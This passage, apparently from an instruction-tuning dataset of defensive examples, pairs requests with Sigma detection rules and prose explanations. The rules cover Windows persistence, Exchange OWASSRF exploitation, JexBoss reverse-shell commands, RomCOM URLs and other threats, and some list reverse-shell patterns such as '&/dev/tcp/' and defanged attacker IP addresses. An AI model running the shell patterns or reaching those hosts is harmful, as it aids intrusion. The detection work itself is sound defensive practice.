    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_target:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\'\n            - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\'\n    selection_details:\n        - Details|contains:\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\$Recycle.bin\\'\n            - 'C:\\Temp\\'\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Users\\Default\\'\n            - 'C:\\Users\\Desktop\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '%temp%\\'\n            - '%tmp%\\'\n        - Details|startswith:\n            - '%Public%\\'\n            - 'wscript'\n            - 'cscript'\n    condition: all of selection_*\nfields:\n    - Image\nfalsepositives:\n    - Software using weird folders for updates\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_target:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\'\n            - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\'\n    selection_details:\n        - Details|contains:\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\$Recycle.bin\\'\n            - 'C:\\Temp\\'\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Users\\Default\\'\n            - 'C:\\Users\\Desktop\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '%temp%\\'\n            - '%tmp%\\'\n        - Details|startswith:\n            - '%Public%\\'\n            - 'wscript'\n            - 'cscript'\n    condition: all of selection_*\nfields:\n    - Image\nfalsepositives:\n    - Software using weird folders for updates\nlevel: high\n",
      "question": "suspicious new RUN key element pointing to an executable in a suspicious folder",
      "answer": "In order to detect suspicious new RUN key element pointing to an executable in a suspicious folder, you should: Focus on monitoring Windows Registry operations specifically within the `registry_set` category with the product set to Windows. Pay attention to events where the type is `SetValue` indicating a value set operation on registry keys. Particularly, scrutinize changes to the `TargetObject` path to include elements related to startup execution paths such as `\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\` and `\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\`. This is critical as these registry paths are commonly used for programs that need to start automatically with Windows.\n\nAdditionally, examine the `Details` of the SetValue operation to identify if the executable or script is located in directories that are not typically used for such purposes, such as `C:\\Windows\\Temp\\`, `C:\\$Recycle.bin\\`, `C:\\Temp\\`, `C:\\Users\\Public\\`, `C:\\Users\\Default\\`, `C:\\Users\\Desktop\\`, `\\AppData\\Local\\Temp\\`, `%temp%\\`, and `%tmp%\\`. Also, be vigilant for `Details` that start with certain indicators like `%Public%\\`, and commands like `wscript` or `cscript` which are scripting tools that can be leveraged maliciously. \n\nMake sure to log and analyze the `Image` field for additional context on the executable or script that's being set to run at startup. Be aware of potential false positives that may arise from legitimate software that utilizes unconventional folders for updates or operations. The level of concern for such detections is considered high due to the typical misuse of these mechanisms by malicious actors for persistence, execution after reboot, or for launching attacks discreetly at system startup. This detection is aligned with MITRE ATT&CK tactics and techniques focusing on persistence and execution methods abused by adversaries."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt of the OWASSRF variant targeting exchange servers It uses the OWA endpoint to access the powershell backend endpoint.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts of the OWASSRF variant targeting exchange servers which uses the OWA endpoint to access the PowerShell backend endpoint, you should monitor the proxy logs for specific patterns of web requests. Specifically, look for POST requests with a 200 status code, indicating a successful interaction, where the requested URI contains both '/owa/' and '/powershell'. Additionally, these requests might also contain '@' or its URL encoded equivalent '%40'. However, it's important to exclude any requests that have user-agent strings associated with 'ClientInfo', 'Microsoft WinRM Client', or 'Exchange BackEnd Probes', as these are generally legitimate inquiries and not indicative of the OWASSRF attack. These exclusions help reduce false positives, which might arise from activities such as web vulnerability scans. Given the critical nature of this attack method, any detection of such patterns should be treated with a high level of concern and investigated promptly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'POST'\n        sc-status: 200\n        c-uri|contains|all:\n            - '/owa/'\n            - '/powershell'\n        c-uri|contains:\n            - '@'\n            - '%40'\n    filter:\n        c-useragent:\n            - 'ClientInfo'\n            - 'Microsoft WinRM Client'\n            - 'Exchange BackEnd Probes'\n    condition: selection and not filter\nfalsepositives:\n    - Web vulnerability scanners\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'POST'\n        sc-status: 200\n        c-uri|contains|all:\n            - '/owa/'\n            - '/powershell'\n        c-uri|contains:\n            - '@'\n            - '%40'\n    filter:\n        c-useragent:\n            - 'ClientInfo'\n            - 'Microsoft WinRM Client'\n            - 'Exchange BackEnd Probes'\n    condition: selection and not filter\nfalsepositives:\n    - Web vulnerability scanners\nlevel: high\n",
      "question": "exploitation attempt of the OWASSRF variant targeting exchange servers It uses the OWA endpoint to access the powershell backend endpoint",
      "answer": "In order to detect exploitation attempts of the OWASSRF variant targeting exchange servers which uses the OWA endpoint to access the PowerShell backend endpoint, you should monitor the proxy logs for specific patterns of web requests. Specifically, look for POST requests with a 200 status code, indicating a successful interaction, where the requested URI contains both '/owa/' and '/powershell'. Additionally, these requests might also contain '@' or its URL encoded equivalent '%40'. However, it's important to exclude any requests that have user-agent strings associated with 'ClientInfo', 'Microsoft WinRM Client', or 'Exchange BackEnd Probes', as these are generally legitimate inquiries and not indicative of the OWASSRF attack. These exclusions help reduce false positives, which might arise from activities such as web vulnerability scans. Given the critical nature of this attack method, any detection of such patterns should be treated with a high level of concern and investigated promptly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious command sequence that JexBoss.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious command sequence that JexBoss, you should: Monitor Linux systems for specific command sequences that indicate potentially malicious activity associated with the exploitation tool JexBoss. Pay attention to logs for the appearance of two distinct command patterns. The first pattern includes the execution of bash with a direct call to another bash shell instance using the syntax 'bash -c /bin/bash'. The second pattern to look for involves the utilization of network communication directly from the shell using '&/dev/tcp/', which may indicate an attempt to establish an outbound connection or listen on incoming connections in an unconventional manner. It is crucial to scrutinize all occurrences of these commands due to the high severity of the threat they might represent. However, be aware that there could be instances where these command sequences are used legitimately, although such cases are unknown. The relevance of this monitoring ties back to tactics and techniques commonly used by adversaries, as documented in the MITRE ATT&CK framework, indicating a sophisticated level of compromise or attack attempt.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    selection1:\n        - 'bash -c /bin/bash'\n    selection2:\n        - '&/dev/tcp/'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    selection1:\n        - 'bash -c /bin/bash'\n    selection2:\n        - '&/dev/tcp/'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious command sequence that JexBoss",
      "answer": "In order to detect suspicious command sequence that JexBoss, you should: Monitor Linux systems for specific command sequences that indicate potentially malicious activity associated with the exploitation tool JexBoss. Pay attention to logs for the appearance of two distinct command patterns. The first pattern includes the execution of bash with a direct call to another bash shell instance using the syntax 'bash -c /bin/bash'. The second pattern to look for involves the utilization of network communication directly from the shell using '&/dev/tcp/', which may indicate an attempt to establish an outbound connection or listen on incoming connections in an unconventional manner. It is crucial to scrutinize all occurrences of these commands due to the high severity of the threat they might represent. However, be aware that there could be instances where these command sequences are used legitimately, although such cases are unknown. The relevance of this monitoring ties back to tactics and techniques commonly used by adversaries, as documented in the MITRE ATT&CK framework, indicating a sophisticated level of compromise or attack attempt."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect modification for a specific user to prevent that user from being listed on the logon screen.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification for a specific user to prevent that user from being listed on the logon screen, you should: focus on monitoring Windows Registry settings modifications, particularly in the registry category that tracks changes. Look for events where the type is set to SetValue, indicating a modification or addition of a registry value. Specifically, observe changes occurring in the registry path that includes '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\\', as this path is crucial for managing user visibility on the login screen. Attention should be paid to target objects that not only contain this path but also end with a dollar sign ('$'), which is often a sign of operations performed on hidden or system accounts. Additionally, check if the modification details involve setting a DWORD value to 0 (0x00000000), which effectively hides the user from the logon screen. Given the high potential for misuse, any such modification should be closely scrutinized, despite the low likelihood of legitimate use cases, thus unknown scenarios are considered as possible false positives. The severity of this activity is considered high due to its potential use in evading detection or maintaining persistent access without immediate visibility to system administrators or users.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\\'\n        TargetObject|endswith: '$'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\\'\n        TargetObject|endswith: '$'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect modification for a specific user to prevent that user from being listed on the logon screen",
      "answer": "In order to detect modification for a specific user to prevent that user from being listed on the logon screen, you should: focus on monitoring Windows Registry settings modifications, particularly in the registry category that tracks changes. Look for events where the type is set to SetValue, indicating a modification or addition of a registry value. Specifically, observe changes occurring in the registry path that includes '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\\', as this path is crucial for managing user visibility on the login screen. Attention should be paid to target objects that not only contain this path but also end with a dollar sign ('$'), which is often a sign of operations performed on hidden or system accounts. Additionally, check if the modification details involve setting a DWORD value to 0 (0x00000000), which effectively hides the user from the logon screen. Given the high potential for misuse, any such modification should be closely scrutinized, despite the low likelihood of legitimate use cases, thus unknown scenarios are considered as possible false positives. The severity of this activity is considered high due to its potential use in evading detection or maintaining persistent access without immediate visibility to system administrators or users."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file download using curl.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file download using curl.exe, you should observe the creation of processes on Windows systems, specifically focusing on cases where 'curl.exe' is involved. Monitor the command line arguments for instances including '-O', '--remote-name', or '--output', as these flags indicate a file is being downloaded. It is crucial to consider the common legitimate uses of these commands, such as scripts authored by developers or administrative tasks, to reduce the likelihood of false positives. Additionally, take special notice if the command originates from a process like \"\\Git\\usr\\bin\\sh.exe\" and targets downloading a file in the temp directory with the pattern \"gfw-httpget-xxxxxxxx.txt \", as this could also be a legitimate use case. Such activities should be examined with a medium level of priority, aligning with the understanding that while curl commands are often used for typical administrative or development functions, they can also serve as a technique for adversaries to obtain files from a remote server, aligning with tactics and techniques like Execution and Command and Control.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - Product: 'The curl executable'\n    selection_remote:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    condition: all of selection_*\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\n    - The \"\\Git\\usr\\bin\\sh.exe\" process uses the \"--output\" flag to download a specific file in the temp directory with the pattern \"gfw-httpget-xxxxxxxx.txt \"\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - Product: 'The curl executable'\n    selection_remote:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    condition: all of selection_*\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\n    - The \"\\Git\\usr\\bin\\sh.exe\" process uses the \"--output\" flag to download a specific file in the temp directory with the pattern \"gfw-httpget-xxxxxxxx.txt \"\nlevel: medium\n",
      "question": "file download using curl.exe",
      "answer": "In order to detect file download using curl.exe, you should observe the creation of processes on Windows systems, specifically focusing on cases where 'curl.exe' is involved. Monitor the command line arguments for instances including '-O', '--remote-name', or '--output', as these flags indicate a file is being downloaded. It is crucial to consider the common legitimate uses of these commands, such as scripts authored by developers or administrative tasks, to reduce the likelihood of false positives. Additionally, take special notice if the command originates from a process like \"\\Git\\usr\\bin\\sh.exe\" and targets downloading a file in the temp directory with the pattern \"gfw-httpget-xxxxxxxx.txt \", as this could also be a legitimate use case. Such activities should be examined with a medium level of priority, aligning with the understanding that while curl commands are often used for typical administrative or development functions, they can also serve as a technique for adversaries to obtain files from a remote server, aligning with tactics and techniques like Execution and Command and Control."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific URL pattern containing a specific extension and parameters pointing to an IP address. This pattern was seen being used by RomCOM potentially exploiting CVE-2023-36884.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a specific URL pattern containing a specific extension and parameters pointing to an IP address, which was seen being used by RomCOM potentially exploiting CVE-2023-36884, you should: Focus on monitoring proxy logs for GET requests that are trying to access URLs with certain file extensions (like zip, asp, htm, url, xml, chm, mht, vbs, or search-ms) followed by a parameter '?d=' that looks to be an IP address in the format of x.x.x.x. This pattern indicates a high-risk attempt, possibly associated with a known vulnerability exploitation. It is crucial to be vigilant of such patterns to timely identify and mitigate potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    # Examples:\n    #   hxxp://74.50[.]94[.]156/MSHTML_C7/zip_k.asp?d=99.99.99.99.\n    #   104.234[.]239[.]26/share1/MSHTML_C7/1/99.99.99.99_a15fa_file001.htm?d=99.99.99.99_ a15fa_\n    selection:\n        cs-method: 'GET'\n        c-uri|re: '\\.(zip|asp|htm|url|xml|chm|mht|vbs|search-ms)\\?d=[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    # Examples:\n    #   hxxp://74.50[.]94[.]156/MSHTML_C7/zip_k.asp?d=99.99.99.99.\n    #   104.234[.]239[.]26/share1/MSHTML_C7/1/99.99.99.99_a15fa_file001.htm?d=99.99.99.99_ a15fa_\n    selection:\n        cs-method: 'GET'\n        c-uri|re: '\\.(zip|asp|htm|url|xml|chm|mht|vbs|search-ms)\\?d=[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "specific URL pattern containing a specific extension and parameters pointing to an IP address. This pattern was seen being used by RomCOM potentially exploiting CVE-2023-36884",
      "answer": "In order to detect a specific URL pattern containing a specific extension and parameters pointing to an IP address, which was seen being used by RomCOM potentially exploiting CVE-2023-36884, you should: Focus on monitoring proxy logs for GET requests that are trying to access URLs with certain file extensions (like zip, asp, htm, url, xml, chm, mht, vbs, or search-ms) followed by a parameter '?d=' that looks to be an IP address in the format of x.x.x.x. This pattern indicates a high-risk attempt, possibly associated with a known vulnerability exploitation. It is crucial to be vigilant of such patterns to timely identify and mitigate potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when storage bucket is modified or deleted in Google Cloud..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a storage bucket is modified or deleted in Google Cloud, you should monitor audit logs within the Google Cloud Platform (GCP) environment, focusing specifically on the GCP audit logging service. This involves looking for instances when methods related to storage buckets, such as `storage.buckets.delete`, `storage.buckets.insert`, `storage.buckets.update`, or `storage.buckets.patch`, are invoked. Activities captured by these methods can indicate that storage buckets are either being created, deleted, updated, or patched.\n\nIt is crucial to assess these actions cautiously as changes to storage buckets may sometimes be legitimate activities conducted by system administrators. Verification processes should include checking that the user identity performing these actions, the user agent used, and the hostname involved are recognized and authorized to make such changes in your Google Cloud environment. In scenarios where modifications or deletions of storage buckets arise from unfamiliar users or sources, these should be subjected to investigation to determine their legitimacy. In cases where known behavior is identified as causing false positives \u2014 that is, legitimate activities being flagged as suspicious \u2014 these can be configured to be exempt from triggering alerts.\n\nUltimately, monitoring for these specific operations concerning storage buckets helps in identifying potential security breaches or unauthorized changes, aligning with best practices in maintaining the integrity and security of data stored in the Google Cloud. This vigilant approach towards monitoring and verifying storage bucket operations within the GCP's audit logging infrastructure aids in the early detection and mitigation of possible threats to cloud-based storage resources.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: gcp\n    service: gcp.audit\ndetection:\n    selection:\n        gcp.audit.method_name:\n            - storage.buckets.delete\n            - storage.buckets.insert\n            - storage.buckets.update\n            - storage.buckets.patch\n    condition: selection\nfalsepositives:\n    - Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: gcp\n    service: gcp.audit\ndetection:\n    selection:\n        gcp.audit.method_name:\n            - storage.buckets.delete\n            - storage.buckets.insert\n            - storage.buckets.update\n            - storage.buckets.patch\n    condition: selection\nfalsepositives:\n    - Storage Buckets being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Storage Buckets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "when storage bucket is modified or deleted in Google Cloud.",
      "answer": "In order to detect when a storage bucket is modified or deleted in Google Cloud, you should monitor audit logs within the Google Cloud Platform (GCP) environment, focusing specifically on the GCP audit logging service. This involves looking for instances when methods related to storage buckets, such as `storage.buckets.delete`, `storage.buckets.insert`, `storage.buckets.update`, or `storage.buckets.patch`, are invoked. Activities captured by these methods can indicate that storage buckets are either being created, deleted, updated, or patched.\n\nIt is crucial to assess these actions cautiously as changes to storage buckets may sometimes be legitimate activities conducted by system administrators. Verification processes should include checking that the user identity performing these actions, the user agent used, and the hostname involved are recognized and authorized to make such changes in your Google Cloud environment. In scenarios where modifications or deletions of storage buckets arise from unfamiliar users or sources, these should be subjected to investigation to determine their legitimacy. In cases where known behavior is identified as causing false positives \u2014 that is, legitimate activities being flagged as suspicious \u2014 these can be configured to be exempt from triggering alerts.\n\nUltimately, monitoring for these specific operations concerning storage buckets helps in identifying potential security breaches or unauthorized changes, aligning with best practices in maintaining the integrity and security of data stored in the Google Cloud. This vigilant approach towards monitoring and verifying storage bucket operations within the GCP's audit logging infrastructure aids in the early detection and mitigation of possible threats to cloud-based storage resources."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting important or interesting Windows services that got terminated unexpectedly..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect important or interesting Windows services that got terminated unexpectedly, you should: Monitor Windows System logs, specifically looking for events from the Service Control Manager. Focus on Event ID 7034, which indicates a service has terminated unexpectedly. Within these events, pay special attention to any occurrences of 'Message Queuing' within the parameter 'param1' or the presence of binary values '4d0053004d005100' (MSMQ in upper case) and '6d0073006d007100' (msmq in lower case) which both identify the Microsoft Message Queuing service. This detection focuses on ensuring that critical messaging services, which may be essential for the operation of various applications and processes, remain uninterrupted. Tags associated with this detection include Persistence, Privilege Escalation, and Defense Evasion, as unexpected termination of these services could be indicative of malicious activity aimed at disrupting normal operations or preparing for further attacks. Note that while true positives should be investigated promptly due to the high criticality of this detection, bear in mind that service terminations can occur for multiple reasons, so rare false positives can occur.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_eid:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7034 # The X service terminated unexpectedly. It has done this Y time(s).\n    selection_name:\n        # Note that these names contained in \"param1\" are \"Display Names\" and are language specific. If you're using a non-english system these can and will be different\n        - param1|contains: 'Message Queuing'\n        # Use this If you collect the binary value provided from this event, which is the wide hex encoded value of the service name.\n        - Binary|contains:\n            - '4d0053004d005100' # MSMQ (Microsoft Message Queuing). Encoded in upper case just in case\n            - '6d0073006d007100' # msmq\n    condition: all of selection_*\nfalsepositives:\n    - Rare false positives could occur since service termination could happen due to multiple reasons\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_eid:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7034 # The X service terminated unexpectedly. It has done this Y time(s).\n    selection_name:\n        # Note that these names contained in \"param1\" are \"Display Names\" and are language specific. If you're using a non-english system these can and will be different\n        - param1|contains: 'Message Queuing'\n        # Use this If you collect the binary value provided from this event, which is the wide hex encoded value of the service name.\n        - Binary|contains:\n            - '4d0053004d005100' # MSMQ (Microsoft Message Queuing). Encoded in upper case just in case\n            - '6d0073006d007100' # msmq\n    condition: all of selection_*\nfalsepositives:\n    - Rare false positives could occur since service termination could happen due to multiple reasons\nlevel: high\n",
      "question": "important or interesting Windows services that got terminated unexpectedly.",
      "answer": "In order to detect important or interesting Windows services that got terminated unexpectedly, you should: Monitor Windows System logs, specifically looking for events from the Service Control Manager. Focus on Event ID 7034, which indicates a service has terminated unexpectedly. Within these events, pay special attention to any occurrences of 'Message Queuing' within the parameter 'param1' or the presence of binary values '4d0053004d005100' (MSMQ in upper case) and '6d0073006d007100' (msmq in lower case) which both identify the Microsoft Message Queuing service. This detection focuses on ensuring that critical messaging services, which may be essential for the operation of various applications and processes, remain uninterrupted. Tags associated with this detection include Persistence, Privilege Escalation, and Defense Evasion, as unexpected termination of these services could be indicative of malicious activity aimed at disrupting normal operations or preparing for further attacks. Note that while true positives should be investigated promptly due to the high criticality of this detection, bear in mind that service terminations can occur for multiple reasons, so rare false positives can occur."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting indicators of APT 29 (Cozy Bear) phishing-campaign as reported by mandiant.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect indicators of APT 29 (Cozy Bear) phishing-campaign as reported by Mandiant, you should: focus on monitoring file events within Windows environments. Specifically, lookout for occurrences where files named 'ds7002.lnk', 'ds7002.pdf', or 'ds7002.zip' are involved. These particular file names have been identified as indicators of this phishing campaign, suggesting a malicious attempt to compromise the system. Since the probability of these specific file names appearing under legitimate circumstances is unlikely, any detection of these should be considered critical and warrants immediate investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains:\n            - 'ds7002.lnk'\n            - 'ds7002.pdf'\n            - 'ds7002.zip'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains:\n            - 'ds7002.lnk'\n            - 'ds7002.pdf'\n            - 'ds7002.zip'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "indicators of APT 29 (Cozy Bear) phishing-campaign as reported by mandiant",
      "answer": "In order to detect indicators of APT 29 (Cozy Bear) phishing-campaign as reported by Mandiant, you should: focus on monitoring file events within Windows environments. Specifically, lookout for occurrences where files named 'ds7002.lnk', 'ds7002.pdf', or 'ds7002.zip' are involved. These particular file names have been identified as indicators of this phishing campaign, suggesting a malicious attempt to compromise the system. Since the probability of these specific file names appearing under legitimate circumstances is unlikely, any detection of these should be considered critical and warrants immediate investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of a new shim using sdbinst.exe, which can be used to load malicious DLLs into applications, you should focus on monitoring process creation within Windows environments. Specifically, you need to identify instances where the process image name ends with '\\sdbinst.exe' and the command line includes '.sdb' strings. However, it is crucial to exclude any command line that contains 'iisexpressshim.sdb' to avoid flagging normal behavior associated with IIS Express. Paying attention to these criteria is essential for accurately identifying potential malicious activities involving shim installations without being misled by false positives. The importance of this detection is underscored by its high severity level, indicating that such activities pose a significant threat and require immediate attention.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sdbinst.exe'\n        CommandLine|contains: '.sdb'\n    filter:\n        CommandLine|contains: 'iisexpressshim.sdb' # normal behaviour for IIS Express (e.g. https://www.hybrid-analysis.com/sample/15d4ff941f77f7bdfc9dfb2399b7b952a0a2c860976ef3e835998ff4796e5e91?environmentId=120)\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sdbinst.exe'\n        CommandLine|contains: '.sdb'\n    filter:\n        CommandLine|contains: 'iisexpressshim.sdb' # normal behaviour for IIS Express (e.g. https://www.hybrid-analysis.com/sample/15d4ff941f77f7bdfc9dfb2399b7b952a0a2c860976ef3e835998ff4796e5e91?environmentId=120)\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.",
      "answer": "In order to detect the installation of a new shim using sdbinst.exe, which can be used to load malicious DLLs into applications, you should focus on monitoring process creation within Windows environments. Specifically, you need to identify instances where the process image name ends with '\\sdbinst.exe' and the command line includes '.sdb' strings. However, it is crucial to exclude any command line that contains 'iisexpressshim.sdb' to avoid flagging normal behavior associated with IIS Express. Paying attention to these criteria is essential for accurately identifying potential malicious activities involving shim installations without being misled by false positives. The importance of this detection is underscored by its high severity level, indicating that such activities pose a significant threat and require immediate attention."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of Clip.exe to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of Clip.exe to execute PowerShell, you should focus on monitoring the PowerShell module activity within the Windows environment. Specifically, look for events where the command line execution patterns match the use of 'cmd' followed by either '/c' or '/r' parameters, and closely thereafter, involves 'clip.exe' or 'clip' command. The detection becomes particularly specific with the inclusion of patterns that combine 'clip' with PowerShell commands that seem to manipulate the clipboard content in a sophisticated manner, indicated by the complex regex pattern provided. These patterns also include the use of '&&' operator, suggesting an attempt to chain commands in a manner that's not typical for regular system or user operations. \n\nMonitoring should be performed with high sensitivity due to the high level of potential impact, but it\u2019s important to note that as of now, the potential for unknown false positives exists, indicating that not all matched patterns could lead to genuine threats. However, given the obfuscated nature of the execution method, any hits on these patterns should be considered with a degree of caution. \n\nThis activity aligns with techniques known in cybersecurity frameworks which describe tactics such as Execution, Defense Evasion, and Command and Control, showing the attacker's efforts to execute commands covertly, evade detection mechanisms, and maintain control over the compromised system through unusual use of system utilities like Clip.exe in conjunction with PowerShell scripting.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|re: '.*cmd.{0,5}(?:/c|/r).+clip(?:\\.exe)?.{0,4}&&.+clipboard]::\\(\\s\\\\\"\\{\\d\\}.+-f.+\"'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        Payload|re: '.*cmd.{0,5}(?:/c|/r).+clip(?:\\.exe)?.{0,4}&&.+clipboard]::\\(\\s\\\\\"\\{\\d\\}.+-f.+\"'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of Clip.exe to execute PowerShell",
